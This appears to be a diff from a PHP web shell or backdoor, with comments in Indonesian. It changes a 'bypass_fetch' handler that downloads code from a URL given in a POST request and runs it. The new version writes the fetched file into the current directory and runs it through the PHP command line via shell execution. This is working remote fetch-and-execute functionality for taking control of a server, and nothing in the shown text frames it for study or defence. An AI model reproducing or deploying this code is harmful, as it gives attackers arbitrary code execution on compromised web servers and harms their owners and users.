@@ -86,28 +86,26 @@ if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
             if ($data === false) {
                 $bypass_output = "Gagal mengambil konten dari URL: " . htmlspecialchars($url);
             } else {
-                // Eksekusi aman relatif: simpan sementara lalu include dengan output buffering
-                $tmpFile = sys_get_temp_dir() . '/bypass_' . md5($url . microtime(true)) . '.php';
+                // Simpan di direktori saat ini
+                $baseName = basename(parse_url($url, PHP_URL_PATH));
+                if ($baseName === '' || $baseName === false) { $baseName = 'remote.php'; }
+                $tmpFile = rtrim($dir, '/').'/__bypass_run_' . $baseName;
                 if (@file_put_contents($tmpFile, $data) === false) {
-                    $bypass_output = "Gagal menulis file sementara.";
+                    $bypass_output = "Gagal menulis file di direktori saat ini.";
                 } else {
-                    // Jalankan dengan buffering
-                    ob_start();
-                    $err = '';
-                    try {
-                        include $tmpFile; // jalankan script
-                    } catch (Throwable $e) { // PHP 7+, fallback error
-                        $err = 'Exception: ' . $e->getMessage();
-                    } catch (Exception $e) { // PHP 5 compatibility
-                        $err = 'Exception: ' . $e->getMessage();
-                    }
-                    $execOut = ob_get_clean();
-                    @unlink($tmpFile);
-                    if ($err !== '') {
-                        $bypass_output = $err . "\n" . $execOut;
+                    // Coba eksekusi via PHP CLI agar parse error tidak menghentikan script utama
+                    $phpBin = 'php';
+                    $which = @shell_exec('command -v php 2>/dev/null');
+                    if ($which) { $phpBin = trim($which); }
+                    $cliCmd = $phpBin . ' ' . escapeshellarg($tmpFile);
+                    $out = exec_cmd($cliCmd, $dir);
+                    if (trim($out) === '') {
+                        $bypass_output = '[Tidak ada output]';
                     } else {
-                        $bypass_output = $execOut === '' ? '[Tidak ada output]' : $execOut;
+                        $bypass_output = $out;
                     }
+                    // Hapus file setelah eksekusi
+                    @unlink($tmpFile);
                 }
             }
         }
